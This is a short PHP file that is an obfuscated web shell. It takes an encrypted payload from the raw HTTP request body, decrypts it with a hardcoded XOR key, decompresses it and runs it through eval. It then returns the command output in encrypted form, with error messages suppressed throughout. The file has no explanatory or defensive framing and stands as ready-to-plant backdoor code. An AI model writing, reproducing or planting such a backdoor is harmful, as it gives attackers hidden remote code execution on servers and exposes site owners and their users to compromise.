<?php
$k="ed21c6fa";$kh="b002ffa0cbd4";$kf="ed0f94992de2";$p="tv3FkE92d11wgQaD";

function x($t,$k){
$c=strlen($k);$l=strlen($t);$o="";
for($i=0;$i<$l;){
for($j=0;($j<$c&&$i<$l);$j++,$i++)
{
$o.=$t[$i]^$k[$j];
}
}
return $o;
}
if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
@ob_start();
@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
$o=@ob_get_contents();
@ob_end_clean();
$r=@base64_encode(@x(@gzcompress($o),$k));
print("$p$kh$r$kf");
}


?>